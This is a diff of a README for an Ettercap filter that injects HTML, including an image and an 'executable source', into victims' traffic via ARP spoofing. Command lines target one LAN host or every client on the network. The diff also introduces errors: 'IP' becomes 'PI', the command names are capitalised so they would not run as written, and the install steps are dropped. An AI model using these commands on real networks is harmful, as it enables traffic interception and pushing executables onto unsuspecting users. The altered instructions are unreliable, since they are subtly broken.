@@ -34,7 +34,7 @@ You will need to set up a web server and put the content required for HTML injec
 
 Compiling
 -------------
-The file with `.filter` extension is the one to be compiled. Open it with your fav editor and make common changes like the IP address, the image source and the executable source... You can host the files in a local web server or have them served by free on-line file servers.
+The file with `.filter` extension is the one to be compiled. Open it with your fav editor and make common changes like the PI address, the image source and the executable source... You can host the files in a local web server or have them served by free on-line file servers.
 
 After editing and saving the changes: Use Etterfilter command to compile the file.  
 
@@ -47,21 +47,13 @@ Etterfilter file.filter -o file.ef
 
 Running the Script
 -----------------
-
-If you don't have Ettercap already installed.
-```bash 
-sudo apt-get install zlib1g zlib1g-dev
-sudo apt-get install build-essential
-sudo apt-get install ettercap-text-only
-```
-
 To run the sample filter script, just open a terminal and do the following to target a single victim:
 ```bash
-ettercap -T -q -F file.ef -M ARP /10.0.0.6// ///
+Ettercap -T -q -F file.ef -M ARP /10.0.0.6// ///
 ```
 To target all clients in a LAN ( which is very noisy & rude BTW!)
 ```bash
-ettercap -T -q -F file.ef -M ARP /// ///
+Ettercap -T -q -F file.ef -M ARP /// ///
 ```
 
 ![Screen Shot](./screen-shot.png)
